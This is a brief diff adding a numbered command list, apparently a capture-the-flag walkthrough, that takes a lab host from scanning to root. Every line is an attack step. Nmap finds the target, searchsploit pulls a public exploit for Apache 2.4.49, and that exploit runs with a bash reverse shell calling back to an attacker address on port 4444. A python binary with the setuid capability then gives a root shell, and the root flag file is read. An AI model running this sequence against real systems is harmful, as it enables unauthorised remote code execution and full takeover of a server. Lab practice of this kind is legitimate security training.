@@ -1,0 +1,8 @@
+1 - nmap -A 10.10.143.108
+2 - searchsploit "apache 2.4.49"
+3 - searchsploit -m 50383
+4 - bash 50383.sh targets.txt /bin/sh "bash -c 'bash -i >& /dev/tcp/10.8.94.51/4444 0>&1'"
+5 - getcap / -r 2>/dev/null (python)
+6 - /usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+7 - cat /root/user.txt
+8 - 
